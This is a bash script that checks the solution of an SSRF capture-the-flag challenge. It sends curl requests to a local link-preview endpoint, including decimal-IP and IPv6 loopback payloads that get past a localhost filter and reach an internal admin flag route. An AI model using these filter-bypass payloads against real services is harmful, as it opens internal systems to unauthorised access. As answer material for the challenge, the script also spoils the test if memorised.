#!/bin/bash

echo "🎯 NewsPreview SSRF CTF Challenge - Solution Test"
echo "================================================"

# Wait for services to be ready
sleep 5

echo ""
echo "1. Testing legitimate request..."
curl -s "http://localhost:3000/preview?link=https://example.com" | jq '.'

echo ""
echo "2. Testing blocked request (should fail)..."
curl -s "http://localhost:3000/preview?link=http://127.0.0.1:5001/admin/flag" | jq '.'

echo ""
echo "3. Testing bypass with decimal IP (should succeed)..."
curl -s "http://localhost:3000/preview?link=http://2130706433:5001/admin/flag" | jq '.'

echo ""
echo "4. Testing bypass with IPv6 (should succeed)..."
curl -s "http://localhost:3000/preview?link=http://[::1]:5001/admin/flag" | jq '.'

echo ""
echo "🎉 If you see the flag above, the challenge is working correctly!"
